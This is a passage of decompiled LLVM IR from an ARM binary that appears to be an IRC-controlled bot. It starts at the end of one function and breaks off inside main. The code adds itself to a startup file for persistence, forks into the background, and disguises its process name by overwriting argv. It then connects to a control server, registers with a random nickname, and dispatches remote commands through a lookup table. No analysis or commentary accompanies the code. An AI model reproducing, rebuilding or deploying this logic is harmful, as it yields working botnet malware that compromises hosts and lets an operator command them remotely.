  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 (i32)* @htons, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_9ea4, { 1, 0 }
  uselistorder label %dec_label_pc_9e84, { 1, 0 }
  uselistorder label %dec_label_pc_9d3c, { 1, 0 }
  uselistorder label %dec_label_pc_9be8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_9c40, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-2708 = alloca i32, align 4
  %stack_var_-404 = alloca i32, align 4
  %stack_var_-394 = alloca i32, align 4
  %stack_var_-1684 = alloca i32, align 4
  %stack_var_-660 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-6804 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_9ee4 = load i32, i32* @r4, align 4
  store i32 %v3_9ee4, i32* %stack_var_-20, align 4
  store i32 40684, i32* %stack_var_-4, align 4
  %v16_9ee4 = ptrtoint i32* %stack_var_-20 to i32
  %v2_9ee8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9ee8, i32* @fp, align 4
  store i32 ptrtoint ([19 x i8]* @global_var_13fa4.355 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_13e94.293 to i32), i32* @r1, align 4
  %v3_9f3c = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_13fa4.355 to i32), i32 ptrtoint (i32* @global_var_13e94.293 to i32))
  %v2_9f4c = icmp eq i32 %v3_9f3c, 0
  br i1 %v2_9f4c, label %dec_label_pc_9f54, label %dec_label_pc_9f70

dec_label_pc_9f54:                                ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_13fb8.358 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_13e94.293 to i32), i32* @r1, align 4
  %v3_9f64 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_13fb8.358 to i32), i32 ptrtoint (i32* @global_var_13e94.293 to i32))
  br label %dec_label_pc_9f70

dec_label_pc_9f70:                                ; preds = %entry, %dec_label_pc_9f54
  %stack_var_-76.0 = phi i32 [ %v3_9f64, %dec_label_pc_9f54 ], [ %v3_9f3c, %entry ]
  %stack_var_-80.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_13fb8.358, i32 0, i32 0), %dec_label_pc_9f54 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_13fa4.355, i32 0, i32 0), %entry ]
  %v2_9f74 = icmp eq i32 %stack_var_-76.0, 0
  br i1 %v2_9f74, label %dec_label_pc_a0fc, label %dec_label_pc_9f7c

dec_label_pc_9f7c:                                ; preds = %dec_label_pc_9f70
  %v1_9f8c = bitcast i8** %argv to i32*
  %v2_9f8c = load i32, i32* %v1_9f8c, align 4
  %v1_9f90 = inttoptr i32 %v2_9f8c to i8*
  %v3_9f94 = call i32 @strlen(i8* %v1_9f90)
  %v2_9fa8 = ptrtoint i32* %stack_var_-344 to i32
  %v2_9fb4 = call i32 @getcwd(i32 %v2_9fa8, i32 256)
  store i32 ptrtoint (i32* @global_var_13fc8.360 to i32), i32* @r1, align 4
  %v2_9fc4 = bitcast i32* %stack_var_-344 to i8*
  %v3_9fc4 = call i32 @__GI_strcoll(i8* %v2_9fc4, i32 ptrtoint (i32* @global_var_13fc8.360 to i32))
  %v2_9fcc = icmp eq i32 %v3_9fc4, 0
  br i1 %v2_9fcc, label %dec_label_pc_a0f4, label %dec_label_pc_9fe4

dec_label_pc_9fd8:                                ; preds = %dec_label_pc_9fe4
  %v1_9fdc = add i32 %stack_var_-60.0, -1
  br label %dec_label_pc_9fe4

dec_label_pc_9fe4:                                ; preds = %dec_label_pc_9f7c, %dec_label_pc_9fd8
  %stack_var_-60.0 = phi i32 [ %v1_9fdc, %dec_label_pc_9fd8 ], [ %v3_9f94, %dec_label_pc_9f7c ]
  %v2_9ff4 = load i32, i32* %v1_9f8c, align 4
  %v2_9ffc = add i32 %v2_9ff4, %stack_var_-60.0
  %v1_a000 = inttoptr i32 %v2_9ffc to i8*
  %v2_a000 = load i8, i8* %v1_a000, align 1
  %v7_a004 = icmp eq i8 %v2_a000, 47
  br i1 %v7_a004, label %dec_label_pc_a00c, label %dec_label_pc_9fd8

dec_label_pc_a00c:                                ; preds = %dec_label_pc_9fe4
  %v2_a01c = load i32, i32* %v1_9f8c, align 4
  %v2_a024 = add i32 %v2_a01c, %stack_var_-60.0
  %v2_a028 = ptrtoint i32* %stack_var_-660 to i32
  store i32 %v2_a028, i32* @r0, align 4
  %v5_a03c = call i32 @sprintf(i32 %v2_a028, i32 ptrtoint ([8 x i8]* @global_var_13fcc.362 to i32), i32 %v2_9fa8, i32 %v2_a024)
  %v1_a088 = inttoptr i32 %stack_var_-76.0 to i8*
  %v2_a044 = ptrtoint i32* %stack_var_-1684 to i32
  %v2_a068 = bitcast i32* %stack_var_-1684 to i8*
  br label %dec_label_pc_a084.outer

dec_label_pc_a044:                                ; preds = %dec_label_pc_a084
  %v3_a054 = call i32 @fgets(i32 %v2_a044, i32 1024, i32 %stack_var_-76.0)
  %v3_a068 = call i32 @__GI_strcasecmp(i8* %v2_a068, i32 %v2_a028)
  %v2_a070 = icmp eq i32 %v3_a068, 0
  br i1 %v2_a070, label %dec_label_pc_a078, label %dec_label_pc_a084

dec_label_pc_a078:                                ; preds = %dec_label_pc_a044
  %v1_a07c = add i32 %stack_var_-56.0.ph, 1
  br label %dec_label_pc_a084.outer

dec_label_pc_a084.outer:                          ; preds = %dec_label_pc_a078, %dec_label_pc_a00c
  %stack_var_-56.0.ph = phi i32 [ %v1_a07c, %dec_label_pc_a078 ], [ 0, %dec_label_pc_a00c ]
  br label %dec_label_pc_a084

dec_label_pc_a084:                                ; preds = %dec_label_pc_a084.outer, %dec_label_pc_a044
  %v2_a088 = call i32 @feof(i8* %v1_a088)
  %v2_a090 = icmp eq i32 %v2_a088, 0
  br i1 %v2_a090, label %dec_label_pc_a044, label %dec_label_pc_a098

dec_label_pc_a098:                                ; preds = %dec_label_pc_a084
  %v2_a09c = icmp eq i32 %stack_var_-56.0.ph, 0
  %v2_a0a8 = call i32 @__GI_fclose(i8* %v1_a088)
  br i1 %v2_a09c, label %dec_label_pc_a0a4, label %dec_label_pc_a0fc

dec_label_pc_a0a4:                                ; preds = %dec_label_pc_a098
  %v4_a0ac = ptrtoint i8* %stack_var_-80.0 to i32
  store i32 %v4_a0ac, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_13fd4.364 to i32), i32* @r1, align 4
  %v3_a0b4 = call i32 @__GI_fopen(i32 %v4_a0ac, i32 ptrtoint (i32* @global_var_13fd4.364 to i32))
  %v2_a0c4 = icmp eq i32 %v3_a0b4, 0
  br i1 %v2_a0c4, label %dec_label_pc_a0fc, label %dec_label_pc_a0cc

dec_label_pc_a0cc:                                ; preds = %dec_label_pc_a0a4
  %v2_a0d8 = call i32 @__GI_fputs(i32 %v2_a028, i32 %v3_a0b4)
  %v1_a0e0 = inttoptr i32 %v3_a0b4 to i8*
  %v2_a0e0 = call i32 @__GI_fclose(i8* %v1_a0e0)
  br label %dec_label_pc_a0fc

dec_label_pc_a0f4:                                ; preds = %dec_label_pc_9f7c
  %v1_a0f8 = inttoptr i32 %stack_var_-76.0 to i8*
  %v2_a0f8 = call i32 @__GI_fclose(i8* %v1_a0f8)
  br label %dec_label_pc_a0fc

dec_label_pc_a0fc:                                ; preds = %dec_label_pc_a098, %dec_label_pc_a0a4, %dec_label_pc_9f70, %dec_label_pc_a0cc, %dec_label_pc_a0f4
  %v0_a0fc = call i32 @__libc_fork()
  %v2_a104 = icmp eq i32 %v0_a0fc, 0
  br i1 %v2_a104, label %dec_label_pc_a114, label %dec_label_pc_a10c

dec_label_pc_a10c:                                ; preds = %dec_label_pc_a0fc
  %v1_a110 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_a114

dec_label_pc_a114:                                ; preds = %dec_label_pc_a0fc, %dec_label_pc_a10c
  %v1_a124 = bitcast i8** %argv to i32*
  %v2_a124 = load i32, i32* %v1_a124, align 4
  store i32 %v2_a124, i32* @r4, align 4
  %v2_a138 = load i32, i32* %v1_a124, align 4
  %v1_a13c = inttoptr i32 %v2_a138 to i8*
  %v3_a140 = call i32 @strlen(i8* %v1_a13c)
  %v0_a148 = load i32, i32* @r4, align 4
  store i32 ptrtoint ([14 x i8]* @global_var_13fd8.366 to i32), i32* @r1, align 4
  %v4_a154 = call i32 @strncpy(i32 %v0_a148, i32 ptrtoint ([14 x i8]* @global_var_13fd8.366 to i32), i32 %v3_a140)
  br label %dec_label_pc_a1d8

dec_label_pc_a164:                                ; preds = %dec_label_pc_a1d8
  %v3_a168 = mul i32 %storemerge14, 4
  %v2_a180 = add i32 %v3_a168, %tmp
  %v1_a184 = inttoptr i32 %v2_a180 to i32*
  %v2_a184 = load i32, i32* %v1_a184, align 4
  store i32 %v2_a184, i32* @r4, align 4
  %v2_a1a8 = load i32, i32* %v1_a184, align 4
  %v1_a1ac = inttoptr i32 %v2_a1a8 to i8*
  %v3_a1b0 = call i32 @strlen(i8* %v1_a1ac)
  %v0_a1b8 = load i32, i32* @r4, align 4
  store i32 %v3_a1b0, i32* @r2, align 4
  %v2_a1c8 = inttoptr i32 %v0_a1b8 to i8*
  %v3_a1c8 = call i32 @__GI_memset(i8* %v2_a1c8, i32 0)
  %v1_a1d0 = add nuw i32 %storemerge14, 1
  br label %dec_label_pc_a1d8

dec_label_pc_a1d8:                                ; preds = %dec_label_pc_a114, %dec_label_pc_a164
  %storemerge14 = phi i32 [ 1, %dec_label_pc_a114 ], [ %v1_a1d0, %dec_label_pc_a164 ]
  %v5_a1f0 = icmp slt i32 %storemerge14, %argc
  br i1 %v5_a1f0, label %dec_label_pc_a164, label %dec_label_pc_a1f4

dec_label_pc_a1f4:                                ; preds = %dec_label_pc_a1d8
  %v2_a1f8 = call i32 @__GI_time(i32* null)
  store i32 %v2_a1f8, i32* @r4, align 4
  %v0_a200 = call i32 @__libc_getpid()
  %v0_a208 = load i32, i32* @r4, align 4
  %v2_a208 = xor i32 %v0_a208, %v0_a200
  store i32 %v2_a208, i32* @r4, align 4
  %v0_a20c = call i32 @getppid()
  %v0_a214 = load i32, i32* @r4, align 4
  %v2_a214 = add i32 %v0_a214, %v0_a20c
  %v1_a21c = call i32 @srand(i32 %v2_a214)
  %v1_a228 = call i32 @makestring(i32 %v1_a21c)
  %v2_a238 = ptrtoint i32* %stack_var_-394 to i32
  %v4_a244 = call i32 @strcpy(i32 %v2_a238, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_13f74.342, i32 0, i32 0))
  store i32 %v1_a228, i32* @r1, align 4
  %v2_a258 = bitcast i32* %stack_var_-394 to i8*
  %v3_a258 = call i32 @strcat(i8* %v2_a258, i32 %v1_a228)
  store i32 %v2_a238, i32* @global_var_20e58.315, align 4
  %v1_a26c = call i32 @makestring(i32 %v3_a258)
  store i32 %v1_a26c, i32* @global_var_20e50.295, align 4
  %v1_a27c = call i32 @makestring(i32 %v1_a26c)
  store i32 %v1_a27c, i32* @global_var_20e60.371, align 4
  store i32 ptrtoint (i32* @global_var_13fe8.374 to i32), i32* @global_var_20e70.302, align 4
  store i32 ptrtoint (i32* @global_var_13fec.377 to i32), i32* @global_var_20e6c.325, align 4
  store i32 ptrtoint (i32* @global_var_13fec.377 to i32), i32* @global_var_20e54.379, align 4
  store i32 0, i32* @global_var_20e64.353, align 4
  %v2_a320 = ptrtoint i32* %stack_var_-660 to i32
  %v2_a3e0 = ptrtoint i32* %stack_var_-404 to i32
  %v2_a5fc = ptrtoint i32* %stack_var_-6804 to i32
  %v2_a638 = add i32 %v16_9ee4, -6784
  %v2_a6ec = ptrtoint i32* %stack_var_-2708 to i32
  %v2_a798 = ptrtoint i32* %stack_var_-1684 to i32
  %v3_a864 = bitcast i32* %stack_var_-1684 to i8*
  br label %dec_label_pc_a2c0

dec_label_pc_a2c0:                                ; preds = %dec_label_pc_a5f0, %dec_label_pc_a35c, %dec_label_pc_a858, %dec_label_pc_a1f4
  %v0_a2c0 = call i32 @con()
  %v2_a2c8 = load i32, i32* @global_var_20e5c.344, align 4
  %v2_a2d0 = load i32, i32* @global_var_20e54.379, align 4
  %v4_a2e0 = call i32 @Send(i32 %v2_a2c8, i32 ptrtoint ([9 x i8]* @global_var_13ff0.383 to i32), i32 %v2_a2d0)
  %v2_a2e8 = load i32, i32* @global_var_20e5c.344, align 4
  %v2_a2f0 = load i32, i32* @global_var_20e58.315, align 4
  %v2_a2f8 = load i32, i32* @global_var_20e50.295, align 4
  store i32 %v2_a2f8, i32* @lr, align 4
  %v4_a318 = call i32 @Send(i32 %v2_a2e8, i32 ptrtoint ([41 x i8]* @global_var_13ffc.385 to i32), i32 %v2_a2f0)
  br label %dec_label_pc_a334.lr.ph

dec_label_pc_a334.lr.ph:                          ; preds = %dec_label_pc_a5a8, %dec_label_pc_a628, %dec_label_pc_a874, %dec_label_pc_a894, %dec_label_pc_a2c0
  br label %dec_label_pc_a334

dec_label_pc_a334:                                ; preds = %dec_label_pc_a334.lr.ph, %dec_label_pc_a334
  %storemerge1529 = phi i32 [ 0, %dec_label_pc_a334.lr.ph ], [ %v1_a348, %dec_label_pc_a334 ]
  %v5_a340 = mul nuw nsw i32 %storemerge1529, 4
  %v6_a340 = add i32 %v5_a340, %v2_a320
  %v7_a340 = inttoptr i32 %v6_a340 to i32*
  store i32 0, i32* %v7_a340, align 4
  %v1_a348 = add nuw nsw i32 %storemerge1529, 1
  %tmp74 = icmp ult i32 %v1_a348, 32
  br i1 %tmp74, label %dec_label_pc_a334, label %dec_label_pc_a35c

dec_label_pc_a35c:                                ; preds = %dec_label_pc_a334
  %v2_a360 = load i32, i32* @global_var_20e5c.344, align 4
  %v3_a364 = udiv i32 %v2_a360, 32
  %v3_a378 = mul nuw nsw i32 %v3_a364, 4
  %v2_a380 = add i32 %v3_a378, %v16_9ee4
  %v2_a384 = add i32 %v2_a380, -640
  %v1_a388 = inttoptr i32 %v2_a384 to i32*
  %v2_a388 = load i32, i32* %v1_a388, align 4
  %v1_a394 = urem i32 %v2_a360, 32
  %v6_a39c = shl i32 1, %v1_a394
  %v2_a3a0 = or i32 %v2_a388, %v6_a39c
  store i32 %v2_a3a0, i32* %v1_a388, align 4
  store i32 1200, i32* %stack_var_-404, align 4
  %v2_a3d4 = load i32, i32* @global_var_20e5c.344, align 4
  %v1_a3d8 = add i32 %v2_a3d4, 1
  %v5_a3f4 = call i32 @__libc_select(i32 %v1_a3d8, i32 %v2_a320, i32 0, i32 0, i32 %v2_a3e0)
  %tmp75 = icmp slt i32 %v5_a3f4, 1
  br i1 %tmp75, label %dec_label_pc_a2c0, label %dec_label_pc_a594.preheader

dec_label_pc_a594.preheader:                      ; preds = %dec_label_pc_a35c
  %v2_a598105 = load i32, i32* @global_var_1e7fc.287, align 4
  %v3_a5a0107 = icmp eq i32 %v2_a598105, 0
  br i1 %v3_a5a0107, label %dec_label_pc_a5a8, label %dec_label_pc_a410

dec_label_pc_a410:                                ; preds = %dec_label_pc_a588, %dec_label_pc_a594.preheader
  %storemerge16114 = phi i32 [ %.pre132, %dec_label_pc_a588 ], [ 0, %dec_label_pc_a594.preheader ]
  %v3_a414 = mul i32 %storemerge16114, 4
  %v2_a420 = load i32, i32* @global_var_20e74.289, align 4
  %v2_a424 = add i32 %v2_a420, %v3_a414
  %v1_a428 = inttoptr i32 %v2_a424 to i32*
  %v2_a428 = load i32, i32* %v1_a428, align 4
  %v3_a438 = call i32 @__libc_waitpid(i32 %v2_a428, i32 0, i32 1)
  %tmp76 = icmp slt i32 %v3_a438, 1
  %.pre132 = add i32 %storemerge16114, 1
  br i1 %tmp76, label %dec_label_pc_a588, label %dec_label_pc_a4a0.preheader

dec_label_pc_a4a0.preheader:                      ; preds = %dec_label_pc_a410
  %v2_a4a484 = load i32, i32* @global_var_1e7fc.287, align 4
  %v3_a4ac86 = icmp ult i32 %.pre132, %v2_a4a484
  %v3_a4b887 = mul i32 %.pre132, 4
  %v2_a4c488 = load i32, i32* @global_var_20e74.289, align 4
  %v2_a4c889 = add i32 %v2_a4c488, %v3_a4b887
  %v1_a4cc90 = add i32 %v2_a4c889, -4
  br i1 %v3_a4ac86, label %dec_label_pc_a458, label %dec_label_pc_a4b4

dec_label_pc_a458:                                ; preds = %dec_label_pc_a4a0.preheader, %dec_label_pc_a458
  %v1_a4cc94 = phi i32 [ %v1_a4cc, %dec_label_pc_a458 ], [ %v1_a4cc90, %dec_label_pc_a4a0.preheader ]
  %v2_a4c893 = phi i32 [ %v2_a4c8, %dec_label_pc_a458 ], [ %v2_a4c889, %dec_label_pc_a4a0.preheader ]
  %v1_a44c91 = phi i32 [ %v1_a44c, %dec_label_pc_a458 ], [ %.pre132, %dec_label_pc_a4a0.preheader ]
  %v1_a48c = inttoptr i32 %v2_a4c893 to i32*
  %v2_a48c = load i32, i32* %v1_a48c, align 4
  %v2_a490 = inttoptr i32 %v1_a4cc94 to i32*
  store i32 %v2_a48c, i32* %v2_a490, align 4
  %v1_a44c = add i32 %v1_a44c91, 1
  %v2_a4a4 = load i32, i32* @global_var_1e7fc.287, align 4
  %v3_a4ac = icmp ult i32 %v1_a44c, %v2_a4a4
  %v3_a4b8 = mul i32 %v1_a44c, 4
  %v2_a4c4 = load i32, i32* @global_var_20e74.289, align 4
  %v2_a4c8 = add i32 %v2_a4c4, %v3_a4b8
  %v1_a4cc = add i32 %v2_a4c8, -4
  br i1 %v3_a4ac, label %dec_label_pc_a458, label %dec_label_pc_a4a0.dec_label_pc_a4b4_crit_edge

dec_label_pc_a4a0.dec_label_pc_a4b4_crit_edge:    ; preds = %dec_label_pc_a458
  br label %dec_label_pc_a4b4

dec_label_pc_a4b4:                                ; preds = %dec_label_pc_a4a0.dec_label_pc_a4b4_crit_edge, %dec_label_pc_a4a0.preheader
  %v1_a4cc.lcssa = phi i32 [ %v1_a4cc, %dec_label_pc_a4a0.dec_label_pc_a4b4_crit_edge ], [ %v1_a4cc90, %dec_label_pc_a4a0.preheader ]
  %v2_a4d4 = inttoptr i32 %v1_a4cc.lcssa to i32*
  store i32 0, i32* %v2_a4d4, align 4
  %v2_a4dc = load i32, i32* @global_var_1e7fc.287, align 4
  %v1_a4e0 = add i32 %v2_a4dc, -1
  store i32 %v1_a4e0, i32* @global_var_1e7fc.287, align 4
  %v3_a4f4 = mul i32 %v1_a4e0, 4
  %v1_a4f8 = add i32 %v3_a4f4, 4
  %v1_a500 = call i32 @malloc(i32 %v1_a4f8)
  %v2_a55c98 = load i32, i32* @global_var_1e7fc.287, align 4
  %v3_a564100 = icmp eq i32 %v2_a55c98, 0
  br i1 %v3_a564100, label %dec_label_pc_a56c, label %dec_label_pc_a518

dec_label_pc_a518:                                ; preds = %dec_label_pc_a4b4, %dec_label_pc_a518
  %storemerge18101 = phi i32 [ %v1_a550, %dec_label_pc_a518 ], [ 0, %dec_label_pc_a4b4 ]
  %v3_a51c = mul i32 %storemerge18101, 4
  %v2_a528 = add i32 %v3_a51c, %v1_a500
  %v2_a53c = load i32, i32* @global_var_20e74.289, align 4
  %v2_a540 = add i32 %v2_a53c, %v3_a51c
  %v1_a544 = inttoptr i32 %v2_a540 to i32*
  %v2_a544 = load i32, i32* %v1_a544, align 4
  %v2_a548 = inttoptr i32 %v2_a528 to i32*
  store i32 %v2_a544, i32* %v2_a548, align 4
  %v1_a550 = add i32 %storemerge18101, 1
  %v2_a55c = load i32, i32* @global_var_1e7fc.287, align 4
  %v3_a564 = icmp ult i32 %v1_a550, %v2_a55c
  br i1 %v3_a564, label %dec_label_pc_a518, label %dec_label_pc_a558.dec_label_pc_a56c_crit_edge

dec_label_pc_a558.dec_label_pc_a56c_crit_edge:    ; preds = %dec_label_pc_a518
  br label %dec_label_pc_a56c

dec_label_pc_a56c:                                ; preds = %dec_label_pc_a4b4, %dec_label_pc_a558.dec_label_pc_a56c_crit_edge
  %v2_a570 = load i32, i32* @global_var_20e74.289, align 4
  store i32 %v2_a570, i32* @r0, align 4
  %v0_a578 = call i32 @free()
  store i32 %v1_a500, i32* @global_var_20e74.289, align 4
  br label %dec_label_pc_a588

dec_label_pc_a588:                                ; preds = %dec_label_pc_a410, %dec_label_pc_a56c
  %v2_a598 = load i32, i32* @global_var_1e7fc.287, align 4
  %v3_a5a0 = icmp ult i32 %.pre132, %v2_a598
  br i1 %v3_a5a0, label %dec_label_pc_a410, label %dec_label_pc_a5a8

dec_label_pc_a5a8:                                ; preds = %dec_label_pc_a588, %dec_label_pc_a594.preheader
  %v2_a5ac = load i32, i32* @global_var_20e5c.344, align 4
  %v3_a5b0 = udiv i32 %v2_a5ac, 32
  %v3_a5bc = mul nuw nsw i32 %v3_a5b0, 4
  %v2_a5c4 = add i32 %v3_a5bc, %v16_9ee4
  %v2_a5c8 = add i32 %v2_a5c4, -640
  %v1_a5cc = inttoptr i32 %v2_a5c8 to i32*
  %v2_a5cc = load i32, i32* %v1_a5cc, align 4
  %v1_a5d8 = urem i32 %v2_a5ac, 32
  %v6_a5dc5 = lshr i32 %v2_a5cc, %v1_a5d8
  %v1_a5e4 = urem i32 %v6_a5dc5, 2
  %v2_a5e8 = icmp eq i32 %v1_a5e4, 0
  br i1 %v2_a5e8, label %dec_label_pc_a334.lr.ph, label %dec_label_pc_a5f0

dec_label_pc_a5f0:                                ; preds = %dec_label_pc_a5a8
  %v5_a610 = call i32 @__libc_recv(i32 %v2_a5ac, i32* nonnull %stack_var_-6804, i32 4096, i32 0)
  %tmp77 = icmp slt i32 %v5_a610, 1
  br i1 %tmp77, label %dec_label_pc_a2c0, label %dec_label_pc_a628

dec_label_pc_a628:                                ; preds = %dec_label_pc_a5f0
  %v2_a63c = add i32 %v2_a638, %v5_a610
  %v3_a63c = inttoptr i32 %v2_a63c to i8*
  store i8 0, i8* %v3_a63c, align 1
  store i32 %v2_a5fc, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_14028.389 to i32), i32* @r1, align 4
  %v6_a658 = call i32 @__GI_strtok(i32 %v2_a5fc, i32 ptrtoint (i32* @global_var_14028.389 to i32), i32 %v2_a63c, i32 %v2_a5fc, i32 %v5_a610)
  %v2_a88c32 = icmp eq i32 %v6_a658, 0
  br i1 %v2_a88c32, label %dec_label_pc_a334.lr.ph, label %dec_label_pc_a894

dec_label_pc_a668:                                ; preds = %dec_label_pc_a894
  %v3_a66c = call i32 @filter(i8* nonnull %storemerge34)
  %v2_a674 = load i8, i8* %storemerge34, align 1
  %v7_a678 = icmp eq i8 %v2_a674, 58
  br i1 %v7_a678, label %dec_label_pc_a698, label %dec_label_pc_a720

dec_label_pc_a68c:                                ; preds = %dec_label_pc_a6b0
  %v1_a690 = add i32 %storemerge23, 1
  br label %dec_label_pc_a698

dec_label_pc_a698:                                ; preds = %dec_label_pc_a668, %dec_label_pc_a68c
  %storemerge23 = phi i32 [ %v1_a690, %dec_label_pc_a68c ], [ 0, %dec_label_pc_a668 ]
  %v3_a6a0 = call i32 @strlen(i8* %storemerge34)
  %v3_a6a8 = icmp ult i32 %storemerge23, %v3_a6a0
  br i1 %v3_a6a8, label %dec_label_pc_a6b0, label %dec_label_pc_a698.dec_label_pc_a6cc_crit_edge

dec_label_pc_a698.dec_label_pc_a6cc_crit_edge:    ; preds = %dec_label_pc_a698
  %.pre = add i32 %storemerge23, %storemerge34.in
  %.pre35 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_a6cc

dec_label_pc_a6b0:                                ; preds = %dec_label_pc_a698
  %v2_a6bc = add i32 %storemerge23, %storemerge34.in
  %v1_a6c0 = inttoptr i32 %v2_a6bc to i8*
  %v2_a6c0 = load i8, i8* %v1_a6c0, align 1
  %v7_a6c4 = icmp eq i8 %v2_a6c0, 32
  br i1 %v7_a6c4, label %dec_label_pc_a6cc, label %dec_label_pc_a68c

dec_label_pc_a6cc:                                ; preds = %dec_label_pc_a6b0, %dec_label_pc_a698.dec_label_pc_a6cc_crit_edge
  %v3_a6e0.pre-phi = phi i8* [ %.pre35, %dec_label_pc_a698.dec_label_pc_a6cc_crit_edge ], [ %v1_a6c0, %dec_label_pc_a6b0 ]
  %v2_a6d8.pre-phi = phi i32 [ %.pre, %dec_label_pc_a698.dec_label_pc_a6cc_crit_edge ], [ %v2_a6bc, %dec_label_pc_a6b0 ]
  store i8 0, i8* %v3_a6e0.pre-phi, align 1
  %v1_a6e8 = add i32 %storemerge34.in, 1
  %v2_a6f8 = inttoptr i32 %v1_a6e8 to i8*
  %v3_a6f8 = call i32 @strcpy(i32 %v2_a6ec, i8* %v2_a6f8)
  %v1_a70c = add i32 %v2_a6d8.pre-phi, 1
  %v3_a718 = inttoptr i32 %v1_a70c to i8*
  %v4_a718 = call i32 @strcpy(i32 %storemerge34.in, i8* %v3_a718)
  br label %dec_label_pc_a74c

dec_label_pc_a720:                                ; preds = %dec_label_pc_a668
  store i32 42, i32* %stack_var_-2708, align 4
  br label %dec_label_pc_a74c

dec_label_pc_a740:                                ; preds = %dec_label_pc_a764
  %v1_a744 = add i32 %storemerge20, 1
  br label %dec_label_pc_a74c

dec_label_pc_a74c:                                ; preds = %dec_label_pc_a720, %dec_label_pc_a6cc, %dec_label_pc_a740
  %storemerge20 = phi i32 [ %v1_a744, %dec_label_pc_a740 ], [ 0, %dec_label_pc_a6cc ], [ 0, %dec_label_pc_a720 ]
  store i32 %storemerge20, i32* @r4, align 4
  %v3_a754 = call i32 @strlen(i8* %storemerge34)
  %v0_a75c = load i32, i32* @r4, align 4
  %v3_a75c = icmp ult i32 %v0_a75c, %v3_a754
  br i1 %v3_a75c, label %dec_label_pc_a764, label %dec_label_pc_a74c.dec_label_pc_a780_crit_edge

dec_label_pc_a74c.dec_label_pc_a780_crit_edge:    ; preds = %dec_label_pc_a74c
  %.pre36 = add i32 %storemerge20, %storemerge34.in
  %.pre37 = inttoptr i32 %.pre36 to i8*
  br label %dec_label_pc_a780

dec_label_pc_a764:                                ; preds = %dec_label_pc_a74c
  %v2_a770 = add i32 %storemerge20, %storemerge34.in
  %v1_a774 = inttoptr i32 %v2_a770 to i8*
  %v2_a774 = load i8, i8* %v1_a774, align 1
  %v7_a778 = icmp eq i8 %v2_a774, 32
  br i1 %v7_a778, label %dec_label_pc_a780, label %dec_label_pc_a740

dec_label_pc_a780:                                ; preds = %dec_label_pc_a764, %dec_label_pc_a74c.dec_label_pc_a780_crit_edge
  %v3_a794.pre-phi = phi i8* [ %.pre37, %dec_label_pc_a74c.dec_label_pc_a780_crit_edge ], [ %v1_a774, %dec_label_pc_a764 ]
  %v2_a78c.pre-phi = phi i32 [ %.pre36, %dec_label_pc_a74c.dec_label_pc_a780_crit_edge ], [ %v2_a770, %dec_label_pc_a764 ]
  store i8 0, i8* %v3_a794.pre-phi, align 1
  %v4_a7a4 = call i32 @strcpy(i32 %v2_a798, i8* %storemerge34)
  %v1_a7b8 = add i32 %v2_a78c.pre-phi, 1
  %v3_a7c4 = inttoptr i32 %v1_a7b8 to i8*
  %v4_a7c4 = call i32 @strcpy(i32 %storemerge34.in, i8* %v3_a7c4)
  %v8_a84c115 = load i32, i32* bitcast ([4 x i8]** @global_var_1e434.392 to i32*), align 4
  %v2_a850117 = icmp eq i32 %v8_a84c115, 0
  br i1 %v2_a850117, label %dec_label_pc_a858, label %dec_label_pc_a7d4

dec_label_pc_a7d4:                                ; preds = %dec_label_pc_a780, %dec_label_pc_a7d4
  %v7_a84c120 = phi i32* [ %v7_a84c, %dec_label_pc_a7d4 ], [ bitcast ([4 x i8]** @global_var_1e434.392 to i32*), %dec_label_pc_a780 ]
  %storemerge21118 = phi i32 [ %v1_a83c, %dec_label_pc_a7d4 ], [ 0, %dec_label_pc_a780 ]
  %v7_a7dc = load i32, i32* %v7_a84c120, align 4
  %v2_a7ec = inttoptr i32 %v7_a7dc to i8*
  %v3_a7ec = call i32 @__GI_strcasecmp(i8* %v2_a7ec, i32 %v2_a798)
  %v3_a808 = mul i32 %storemerge21118, 8
  %v2_a810 = add i32 %v3_a808, add (i32 ptrtoint ([4 x i8]** @global_var_1e434.392 to i32), i32 4)
  %v1_a814 = inttoptr i32 %v2_a810 to i32*
  %v2_a814 = load i32, i32* %v1_a814, align 4
  store i32 %v2_a814, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v2_a814)
  %v1_a83c = add i32 %storemerge21118, 1
  %v5_a84c = mul i32 %v1_a83c, 8
  %v6_a84c = add i32 %v5_a84c, ptrtoint ([4 x i8]** @global_var_1e434.392 to i32)
  %v7_a84c = inttoptr i32 %v6_a84c to i32*
  %v8_a84c = load i32, i32* %v7_a84c, align 4
  %v2_a850 = icmp eq i32 %v8_a84c, 0
  br i1 %v2_a850, label %dec_label_pc_a858, label %dec_label_pc_a7d4

dec_label_pc_a858:                                ; preds = %dec_label_pc_a7d4, %dec_label_pc_a780
  %v4_a864 = call i32 @__GI_strcasecmp(i8* %v3_a864, i32 ptrtoint ([6 x i8]* @global_var_1402c.394 to i32))
  %v2_a86c = icmp eq i32 %v4_a864, 0
  br i1 %v2_a86c, label %dec_label_pc_a2c0, label %dec_label_pc_a874

dec_label_pc_a874:                                ; preds = %dec_label_pc_a858
  store i32 0, i32* @r0, align 4
